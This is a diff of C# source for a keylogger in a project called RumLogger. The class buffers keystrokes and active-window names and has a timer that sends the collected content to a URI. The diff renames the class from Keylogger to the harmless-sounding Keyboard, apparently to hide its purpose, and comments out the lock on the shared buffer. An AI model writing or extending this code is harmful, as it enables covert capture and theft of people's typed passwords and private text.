@@ -11,7 +11,7 @@ using Timer = System.Threading.Timer;
 
 namespace RumLogger;
 
-internal class Keylogger : IDisposable
+internal class Keyboard : IDisposable
 {
     private readonly StringBuilder _contentBuilder;
     private readonly Uri _uri;
@@ -24,7 +24,7 @@ internal class Keylogger : IDisposable
 
     public string WindowName { get; private set; }
 
-    public Keylogger()
+    public Keyboard()
     {
         _sendTimer = new Timer(SendCallback, null, _sendPeriod, _sendPeriod);
         _waitTimer = new Timer(WaitCallback, null, _waitTime, _waitTime);
@@ -45,10 +45,10 @@ internal class Keylogger : IDisposable
         Log(" ");
     }
 
-    private object _lock = new ();
+    private readonly object _lock = new ();
     private void Log(string str)
     {
-        lock (_lock)
+        //lock (_lock)
         {
             _contentBuilder.Append(str);
             Trace.Write(str);
@@ -70,7 +70,7 @@ internal class Keylogger : IDisposable
             if (WindowName != windowName)
             {
                 WindowName = windowName.Trim();
-                Log($"<Window {WindowName}>");
+                Log($"«Window {WindowName}»");
             }
 
             var caps = Console.CapsLock;
